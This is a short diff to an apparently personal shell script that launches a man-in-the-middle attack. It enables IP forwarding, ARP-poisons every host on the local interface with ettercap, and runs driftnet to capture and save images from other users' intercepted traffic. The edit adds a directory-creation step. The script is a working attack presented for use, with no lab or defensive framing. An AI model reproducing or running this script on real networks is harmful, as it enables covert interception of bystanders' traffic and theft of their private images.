@@ -6,7 +6,8 @@ echo "$(tput bold)$(tput setaf 1)MITM initialize$(tput sgr0)"
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning 
 sudo ettercap -T -Q -M arp -i eth0 // // &
 sleep 10
-echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
-sudo driftnet -v -i eth0 -a -m 100 -d imageDirectory -x myImages && fg ##save 100 images
+echo "$(tput bold)$(tput setaf 1)make directory, extract images & save$(tput sgr0)"
+sudo mkdir imageDirectory
+sudo driftnet -v -i eth0 -a -m 100 -d imageDirectory -x myImages && fg ##save 100 images in directory "imageDirectory"
 #sudo rm !(filename).gif  # remove all .gif files. nothing personal.
 
